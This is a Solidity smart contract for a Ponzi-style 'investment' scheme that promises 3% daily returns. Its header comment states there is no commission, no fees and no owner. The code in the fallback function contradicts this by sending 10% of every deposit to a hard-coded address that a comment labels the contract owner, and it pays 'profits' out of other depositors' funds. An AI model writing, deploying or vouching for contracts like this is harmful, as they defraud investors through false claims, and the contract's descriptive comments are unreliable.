1 pragma solidity ^0.4.24;
2 
3 /**
4  *
5  * Three Ether Free Contract
6  *  - GAIN 3% PER 24 HOURS (every 5900 blocks)
7  *  - NO COMMISSION on your investment (every ether stays on contract's balance)
8  *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)
9  *  - Marketing Campain
10  *
11  * How to use:
12  *  1. Send any amount of ether to make an investment
13  *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)
14  *  OR
15  *  2b. Send more ether to reinvest AND get your profit at the same time
16  *
17  * RECOMMENDED GAS LIMIT: 70000
18  * RECOMMENDED GAS PRICE: https://ethgasstation.info/
19  *
20  */
21 contract ThreeEtherFree {
22     address marketing;
23     
24     function ThreeEtherFree() {
25         // Contract owner address
26         marketing = 0x02490cbea9524a21a03eae01d3decb5eca4f7672;
27     }
28     
29     mapping (address => uint256) balances;
30     mapping (address => uint256) timestamp;
31 
32     function() external payable {
33         // Marketing campain
34         uint256 getmsgvalue = msg.value / 10;
35         marketing.transfer(getmsgvalue);
36         
37         // Payout
38         if (balances[msg.sender] != 0)
39         {
40             address sender = msg.sender;
41             uint256 getvalue = balances[msg.sender]*3/100*(block.number-timestamp[msg.sender])/5900;
42             sender.transfer(getvalue);
43         }
44 
45         // Update user info
46         timestamp[msg.sender] = block.number;
47         // Reinvest
48         balances[msg.sender] += msg.value;
49 
50     }
51 }